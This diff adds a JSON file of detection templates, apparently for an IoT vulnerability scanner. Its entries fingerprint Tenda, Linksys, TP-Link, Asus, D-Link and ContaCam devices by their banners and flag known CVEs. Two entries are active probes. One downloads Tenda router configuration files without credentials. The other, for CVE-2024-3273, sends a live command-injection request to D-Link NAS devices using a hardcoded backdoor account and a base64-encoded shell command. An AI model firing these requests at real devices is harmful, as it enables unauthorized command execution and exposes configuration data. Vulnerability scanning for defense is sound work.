@@ -1,0 +1,270 @@
+{
+    "entries": {
+        "Tenda Dashboard Pubilcly Exposed": {
+            "tag": "Tenda",
+            "payload": {
+                "paths": [
+                    "index.html"
+                ],
+                "headers": {
+                    "Upgrade-Insecure-Requests": "1",
+                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36",
+                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+                    "Accept-Encoding": "gzip, deflate, br",
+                    "Accept-Language": "en-US,en;q=0.9"
+                },
+                "method": "GET"
+            },
+            "matchers": {
+                "response_code": 200,
+                "responsePath": "",
+                "strings": [
+                    "Advanced",
+                    "Administration",
+                    "Status"
+                ]
+            },
+            "issue": "Tenda Dashboard Publicly Exposed Without Any Authentication"
+        },
+        "Tenda Config File Exposed": {
+            "tag": "Tenda",
+            "payload": {
+                "paths": [
+                    "cgi-bin/DownloadCfg/RouterCfm.cfg"
+                ],
+                "headers": {
+                    "Upgrade-Insecure-Requests": "1",
+                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36",
+                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+                    "Accept-Encoding": "gzip, deflate, br",
+                    "Accept-Language": "en-US,en;q=0.9"
+                },
+                "method": "GET"
+            },
+            "matchers": {
+                "response_code": 200,
+                "responsePath": "",
+                "strings": [
+                    "dhcp_static",
+                    "filter_"
+                ]
+            },
+            "issue": "Tenda Config File Exposed"
+        },
+        "Linksys E2500 OS Command Injection": {
+            "tag": "Linksys",
+            "payload": {
+                "paths": [
+                    ""
+                ],
+                "headers": {
+                    "Upgrade-Insecure-Requests": "1",
+                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36",
+                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+                    "Accept-Encoding": "gzip, deflate, br",
+                    "Accept-Language": "en-US,en;q=0.9"
+                },
+                "method": "GET"
+            },
+            "matchers": {
+                "headers": {
+                    "WWW-Authenticate": "Basic realm=\"Linksys E2500"
+                },
+                "condition": "AND"
+            },
+            "issue": "Linksys E2500 Potentially Vulnerable to OS Command Injection - CVE-2018-3955 | CVECVE-2018-3954 | CVE-2018-3953"
+        },
+        "Linksys EA3500 Sensitive Information Leakage": {
+            "tag": "Linksys",
+            "payload": {
+                "paths": [
+                    ""
+                ],
+                "headers": {
+                    "Upgrade-Insecure-Requests": "1",
+                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36",
+                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+                    "Accept-Encoding": "gzip, deflate, br",
+                    "Accept-Language": "en-US,en;q=0.9"
+                },
+                "method": "GET"
+            },
+            "matchers": {
+                "headers": {
+                    "WWW-Authenticate": "Basic realm=\"Linksys EA3500"
+                },
+                "condition": "AND"
+            },
+            "issue": "Linksys EA3500 Potentially Vulnerable to Sensitive Information Leakage - CVE-2014-8244"
+        },
+        "TP-LINK Wireless N Router WR841N Buffer Overflow": {
+            "tag": "TP-Link",
+            "payload": {
+                "paths": [
+                    ""
+                ],
+                "headers": {
+                    "Upgrade-Insecure-Requests": "1",
+                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36",
+                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+                    "Accept-Encoding": "gzip, deflate, br",
+                    "Accept-Language": "en-US,en;q=0.9"
+                },
+                "method": "GET"
+            },
+            "matchers": {
+                "headers": {
+                    "WWW-Authenticate": "Basic realm=\"TP-LINK Wireless N Router WR841N"
+                },
+                "condition": "AND"
+            },
+            "issue": "TP-LINK Wireless N Router WR841N Potentially Vulnerable to Buffer Overflow - CVE-2020-8423"
+        },
+        "TP-LINK Wireless N Router WR940N Stack-based Buffer Overflow": {
+            "tag": "TP-Link",
+            "payload": {
+                "paths": [
+                    ""
+                ],
+                "headers": {
+                    "Upgrade-Insecure-Requests": "1",
+                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36",
+                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+                    "Accept-Encoding": "gzip, deflate, br",
+                    "Accept-Language": "en-US,en;q=0.9"
+                },
+                "method": "GET"
+            },
+            "matchers": {
+                "headers": {
+                    "WWW-Authenticate": "Basic realm=\"TP-LINK Wireless N Router WR940N"
+                },
+                "condition": "AND"
+            },
+            "issue": "TP-LINK Wireless N Router WR940N Potentially Vulnerable to Stack-based Buffer Overflow - CVE-2022-24355"
+        },
+        "Asus Wireless Router RT-N12E Missing Authentication for Critical Function": {
+            "tag": "Asus",
+            "payload": {
+                "paths": [
+                    ""
+                ],
+                "headers": {
+                    "Upgrade-Insecure-Requests": "1",
+                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36",
+                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+                    "Accept-Encoding": "gzip, deflate, br",
+                    "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8"
+                },
+                "method": "GET"
+            },
+            "matchers": {
+                "headers": {
+                    "Www-Authenticate": "Basic realm=\"RT-N12E\""
+                },
+                "strings": [
+                    "Authorization required."
+                ],
+                "response_code": 401,
+                "condition": "AND"
+            },
+            "issue": "Asus Wireless Router RT-N12E Potentially Vulnerable to Missing Authentication for Critical Function - CVE-2020-23648"
+        },
+        "D-Link DIR-850L Code Injection": {
+            "tag": "D-Link",
+            "payload": {
+                "paths": [
+                    ""
+                ],
+                "headers": {
+                    "Upgrade-Insecure-Requests": "1",
+                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36",
+                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+                    "Accept-Encoding": "gzip, deflate, br",
+                    "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8"
+                },
+                "method": "GET"
+            },
+            "matchers": {
+                "strings": [
+                    "DIR-850L"
+                ],
+                "response_code": 200,
+                "condition": "AND"
+            },
+            "issue": "D-Link DIR-850L Potentially Vulnerable to Code Injection - CVE-2023-49004"
+        },
+        "D-Link DIR-850L Improper Authentication": {
+            "tag": "D-Link",
+            "payload": {
+                "paths": [
+                    ""
+                ],
+                "headers": {
+                    "Upgrade-Insecure-Requests": "1",
+                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36",
+                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+                    "Accept-Encoding": "gzip, deflate, br",
+                    "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8"
+                },
+                "method": "GET"
+            },
+            "matchers": {
+                "strings": [
+                    "DIR-850L"
+                ],
+                "response_code": 200,
+                "condition": "AND"
+            },
+            "issue": "D-Link DIR-850L Potentially Vulnerable to Improper Authentication - CVE-2018-18907"
+        },
+        "ContaCam Without Password": {
+            "tag": "ContaCam",
+            "payload": {
+                "paths": [
+                    ""
+                ],
+                "headers": {
+                    "Upgrade-Insecure-Requests": "1",
+                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36",
+                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+                    "Accept-Encoding": "gzip, deflate, br",
+                    "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8"
+                },
+                "method": "GET"
+            },
+            "matchers": {
+                "strings": [
+                    "iframe0"
+                ],
+                "response_code": 200,
+                "condition": "AND"
+            },
+            "issue": "ContaCam Web Interface Publicly Exposed Without Authentication"
+        },
+        "D-Link NAS CVE-2024-3273": {
+            "tag": "D-Link",
+            "payload": {
+                "paths": [
+                    "cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system=bHM="
+                ],
+                "headers": {
+                    "Upgrade-Insecure-Requests": "1",
+                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36",
+                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+                    "Accept-Encoding": "gzip, deflate, br",
+                    "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8"
+                },
+                "method": "GET"
+            },
+            "matchers": {
+                "strings": [
+                    "config", "nas_sharing", "cgi"
+                ],
+                "response_code": 200,
+                "condition": "AND"
+            },
+            "issue": "D-Link NAS Instance Vulnerable to Command Injection - CVE-2024-3273"
+        }
+    }
+}
